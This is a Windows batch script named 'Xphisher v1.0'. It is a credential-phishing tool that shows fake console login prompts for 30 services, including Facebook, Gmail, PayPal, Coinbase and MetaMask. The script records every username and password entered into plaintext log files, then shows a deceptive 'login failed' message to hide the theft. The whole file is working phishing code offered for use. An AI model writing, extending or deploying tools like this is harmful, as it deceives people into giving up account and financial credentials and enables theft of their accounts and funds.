@echo off
title Xphisher v1.0
color 0c
mode con: cols=80 lines=40

:XPHISHER
cls
echo ============================================================
echo                    XPHISHER v1.0
echo ============================================================
echo.
echo [1] Facebook
echo [2] Instagram
echo [3] Twitter/X
echo [4] TikTok
echo [5] Snapchat
echo [6] LinkedIn
echo [7] YouTube
echo [8] WhatsApp Web
echo [9] Telegram
echo [10] Discord
echo [11] Reddit
echo [12] Pinterest
echo [13] Twitch
echo [14] OnlyFans
echo [15] Tinder
echo [16] Uber
echo [17] Airbnb
echo [18] Amazon
echo [19] PayPal
echo [20] Netflix
echo [21] Spotify
echo [22] Steam
echo [23] Gmail
echo [24] Outlook
echo [25] Yahoo
echo [26] GitHub
echo [27] Dropbox
echo [28] Coinbase
echo [29] Binance
echo [30] MetaMask
echo.
echo [Q] Quit
echo.
set /p choice="Select target (1-30, Q): "

if /i "%choice%"=="Q" goto END
if "%choice%"=="1" goto FACEBOOK
if "%choice%"=="2" goto INSTAGRAM
if "%choice%"=="3" goto TWITTER
if "%choice%"=="4" goto TIKTOK
if "%choice%"=="5" goto SNAPCHAT
if "%choice%"=="6" goto LINKEDIN
if "%choice%"=="7" goto YOUTUBE
if "%choice%"=="8" goto WHATSAPP
if "%choice%"=="9" goto TELEGRAM
if "%choice%"=="10" goto DISCORD
if "%choice%"=="11" goto REDDIT
if "%choice%"=="12" goto PINTEREST
if "%choice%"=="13" goto TWITCH
if "%choice%"=="14" goto ONLYFANS
if "%choice%"=="15" goto TINDER
if "%choice%"=="16" goto UBER
if "%choice%"=="17" goto AIRBNB
if "%choice%"=="18" goto AMAZON
if "%choice%"=="19" goto PAYPAL
if "%choice%"=="20" goto NETFLIX
if "%choice%"=="21" goto SPOTIFY
if "%choice%"=="22" goto STEAM
if "%choice%"=="23" goto GMAIL
if "%choice%"=="24" goto OUTLOOK
if "%choice%"=="25" goto YAHOO
if "%choice%"=="26" goto GITHUB
if "%choice%"=="27" goto DROPBOX
if "%choice%"=="28" goto COINBASE
if "%choice%"=="29" goto BINANCE
if "%choice%"=="30" goto METAMASK
goto XPHISHER

:CREATE_LOG
set logfile="Xphisher_log_%date:~-4,4%%date:~-7,2%%date:~-10,2%_%time:~0,2%%time:~3,2%%time:~6,2%.txt"
set logfile=%logfile: =0%
exit /b

:LOGIN_FORM
setlocal enabledelayedexpansion
set "service_name=%1"
set "service_color=%2"
color %service_color%
cls
echo ============================================================
echo                    %service_name%
echo ============================================================
echo.
set /p "username=Enter email/username: "
echo.
set /p "password=Enter password: "
echo.
echo Processing...
ping localhost -n 3 >nul
cls
echo ============================================================
echo                    %service_name%
echo ============================================================
echo.
echo Verifying credentials...
ping localhost -n 2 >nul
cls
echo ============================================================
echo                    %service_name%
echo ============================================================
echo.
echo Signing in...
ping localhost -n 2 >nul

:: Save to log
if not exist "Xphisher_logs\" mkdir "Xphisher_logs"
set "timestamp=%date% %time%"
echo [%timestamp%] TARGET: %service_name% >> "Xphisher_logs\credentials_%date:~-4,4%%date:~-7,2%%date:~-10,2%.txt"
echo [%timestamp%] USER: %username% >> "Xphisher_logs\credentials_%date:~-4,4%%date:~-7,2%%date:~-10,2%.txt"
echo [%timestamp%] PASS: %password% >> "Xphisher_logs\credentials_%date:~-4,4%%date:~-7,2%%date:~-10,2%.txt"
echo [%timestamp%] ---------------------------------------- >> "Xphisher_logs\credentials_%date:~-4,4%%date:~-7,2%%date:~-10,2%.txt"

cls
echo ============================================================
echo                    LOGIN FAILED
echo ============================================================
echo.
echo Incorrect username or password.
echo.
echo You have been logged out for security.
echo.
echo Technical information has been saved for analysis.
echo.
pause
goto XPHISHER
endlocal

:FACEBOOK
call :LOGIN_FORM "Facebook" "09"
goto XPHISHER

:INSTAGRAM
call :LOGIN_FORM "Instagram" "05"
goto XPHISHER

:TWITTER
call :LOGIN_FORM "Twitter/X" "0a"
goto XPHISHER

:TIKTOK
call :LOGIN_FORM "TikTok" "0e"
goto XPHISHER

:SNAPCHAT
call :LOGIN_FORM "Snapchat" "06"
goto XPHISHER

:LINKEDIN
call :LOGIN_FORM "LinkedIn" "01"
goto XPHISHER

:YOUTUBE
call :LOGIN_FORM "YouTube" "04"
goto XPHISHER

:WHATSAPP
call :LOGIN_FORM "WhatsApp Web" "02"
goto XPHISHER

:TELEGRAM
call :LOGIN_FORM "Telegram" "03"
goto XPHISHER

:DISCORD
call :LOGIN_FORM "Discord" "07"
goto XPHISHER

:REDDIT
call :LOGIN_FORM "Reddit" "04"
goto XPHISHER

:PINTEREST
call :LOGIN_FORM "Pinterest" "0c"
goto XPHISHER

:TWITCH
call :LOGIN_FORM "Twitch" "05"
goto XPHISHER

:ONLYFANS
call :LOGIN_FORM "OnlyFans" "0e"
goto XPHISHER

:TINDER
call :LOGIN_FORM "Tinder" "0d"
goto XPHISHER

:UBER
call :LOGIN_FORM "Uber" "08"
goto XPHISHER

:AIRBNB
call :LOGIN_FORM "Airbnb" "0c"
goto XPHISHER

:AMAZON
call :LOGIN_FORM "Amazon" "06"
goto XPHISHER

:PAYPAL
call :LOGIN_FORM "PayPal" "01"
goto XPHISHER

:NETFLIX
call :LOGIN_FORM "Netflix" "04"
goto XPHISHER

:SPOTIFY
call :LOGIN_FORM "Spotify" "02"
goto XPHISHER

:STEAM
call :LOGIN_FORM "Steam" "07"
goto XPHISHER

:GMAIL
call :LOGIN_FORM "Gmail" "0f"
goto XPHISHER

:OUTLOOK
call :LOGIN_FORM "Outlook" "01"
goto XPHISHER

:YAHOO
call :LOGIN_FORM "Yahoo" "06"
goto XPHISHER

:GITHUB
call :LOGIN_FORM "GitHub" "08"
goto XPHISHER

:DROPBOX
call :LOGIN_FORM "Dropbox" "01"
goto XPHISHER

:COINBASE
call :LOGIN_FORM "Coinbase" "03"
goto XPHISHER

:BINANCE
call :LOGIN_FORM "Binance" "06"
goto XPHISHER

:METAMASK
call :LOGIN_FORM "MetaMask" "0e"
goto XPHISHER

:END
cls
echo ============================================================
echo               Thank you for using Xphisher
echo ============================================================
echo.
echo Logs saved to: .\Xphisher_logs\
echo.
ping localhost -n 2 >nul
exit